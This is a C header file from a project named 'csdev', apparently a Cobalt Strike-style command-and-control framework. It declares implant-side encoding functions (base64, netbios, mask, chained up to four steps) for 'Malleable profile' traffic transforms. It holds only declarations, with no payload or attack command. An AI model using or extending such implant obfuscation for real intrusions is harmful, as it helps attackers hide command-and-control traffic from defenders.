/*
 * csdev :: xform.h  --  Malleable profile body 变换 (植入体侧)
 * ==========================================================================
 * 与 go/profile/model.go 的变换实现逐算法对齐, 保证两侧可逆互通。
 * 支持: raw / base64 / base64url / netbios / netbiosu / mask
 * 链式写法: "base64", "base64+mask" (最多 4 级)
 * ==========================================================================
 */
#ifndef CSDEV_XFORM_H
#define CSDEV_XFORM_H

#define XF_NONE     0
#define XF_BASE64   1
#define XF_BASE64U  2
#define XF_NETBIOS  3
#define XF_NETBIOSU 4
#define XF_MASK     5

#define XF_MAX_CHAIN 4

typedef struct {
    int kinds[XF_MAX_CHAIN];
    int n;
} xform_chain;

/* 名称 → 编号; 未知返回 -1 */
int xform_kind(const char *name);

/* 解析链式规格 (以 '+' 分隔); 成功返回 0 */
int xform_chain_parse(xform_chain *c, const char *spec);

/* 链式正变换 / 逆变换。
 * 返回 0 成功 (长度写入 *outlen), 非 0 为错误码:
 *   1 = 参数非法  2 = 输出缓冲不足  3 = 解码失败 */
int xform_encode(const xform_chain *c, const unsigned char *in, unsigned int inlen,
                 unsigned char *out, unsigned int outcap, unsigned int *outlen);
int xform_decode(const xform_chain *c, const unsigned char *in, unsigned int inlen,
                 unsigned char *out, unsigned int outcap, unsigned int *outlen);

/* 单级变换 (供自测使用) */
int xform_one(int kind, int decode, const unsigned char *in, unsigned int inlen,
              unsigned char *out, unsigned int outcap, unsigned int *outlen);

#endif /* CSDEV_XFORM_H */
